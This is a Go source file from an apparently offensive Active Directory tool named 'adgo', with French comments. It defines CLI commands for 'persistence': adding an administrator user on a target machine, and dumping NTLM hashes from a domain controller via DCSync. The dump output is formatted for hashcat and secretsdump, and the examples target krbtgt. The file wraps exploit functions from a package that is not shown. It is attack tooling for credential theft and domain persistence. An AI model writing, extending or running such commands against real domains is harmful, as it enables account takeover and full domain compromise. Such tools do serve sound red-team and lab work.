// cmd/adgo/commands/persistence.go

package commands

import (
	"fmt"

	"adgo/pkg/common"
	"adgo/pkg/exploits"

	"github.com/spf13/cobra"
)

// AddAdminUserCmd ajoute un utilisateur administrateur.
var AddAdminUserCmd = &cobra.Command{
	Use:   "add-admin-user",
	Short: "Add an Administrator user",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")

		err := exploits.AddAdminUser(target, username, password)
		if err != nil {
			common.PrintError(fmt.Errorf("failed to add admin user: %v", err))
			return err
		}

		common.PrintSuccess(fmt.Sprintf("User %s added successfully as Administrator", username))
		return nil
	},
}

// DumpNTLMHashesCmd dump les hashs NTLM avec DCSync natif Go.
var DumpNTLMHashesCmd = &cobra.Command{
	Use:   "dump-ntlm",
	Short: "Dump NTLM hashes using native DCSync (MS-DRSR, no external dependencies)",
	Example: `
  adgo persistence dump-ntlm -u admin -p Password123 -d lab.local --dc-ip 192.168.1.10
  adgo persistence dump-ntlm -u admin -p Password123 -d lab.local --dc-ip 192.168.1.10 --user krbtgt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		domain, _ := cmd.Flags().GetString("domain")
		targetUser, _ := cmd.Flags().GetString("user")

		// Fallback sur les flags globaux si pas de flags locaux
		if username == "" {
			username = common.Username
		}
		if password == "" {
			password = common.Password
		}
		if domain == "" {
			domain = common.Domain
		}

		if dcIP == "" || username == "" || domain == "" {
			return fmt.Errorf("--dc-ip, --username and --domain required")
		}

		common.PrintInfo(fmt.Sprintf("DCSync on %s (%s\\%s)", dcIP, domain, username))

		hashes, err := exploits.DCSync(dcIP, username, domain, password, targetUser)
		if err != nil {
			common.PrintError(fmt.Errorf("DCSync failed: %v", err))
			return err
		}

		for _, h := range hashes {
			// Format compatible hashcat / impacket secretsdump
			fmt.Printf("%s\\%s:::%s:%s:::\n",
				h.Domain, h.SAMAccountName, h.LMHash, h.NTHash)
		}

		common.PrintSuccess(fmt.Sprintf("%d hash(s) retrieved", len(hashes)))
		return nil
	},
}

func init() {
	AddAdminUserCmd.Flags().String("target", "", "Target machine")
	AddAdminUserCmd.Flags().String("username", "", "Username for new admin user")
	AddAdminUserCmd.Flags().String("password", "", "Password for new admin user")

	DumpNTLMHashesCmd.Flags().String("dc-ip", "", "IP address of the Domain Controller")
	DumpNTLMHashesCmd.Flags().String("username", "", "Username for DCSync")
	DumpNTLMHashesCmd.Flags().String("password", "", "Password for DCSync")
	DumpNTLMHashesCmd.Flags().String("domain", "", "Domain name (ex: lab.local)")
	DumpNTLMHashesCmd.Flags().String("user", "", "Target a specific user (ex: krbtgt, administrator)")

	PersistenceCmd.AddCommand(AddAdminUserCmd)
	PersistenceCmd.AddCommand(DumpNTLMHashesCmd)
}

// PersistenceCmd est la commande racine pour les opérations de persistance.
var PersistenceCmd = &cobra.Command{
	Use:   "persistence",
	Short: "Persistence operations",
}
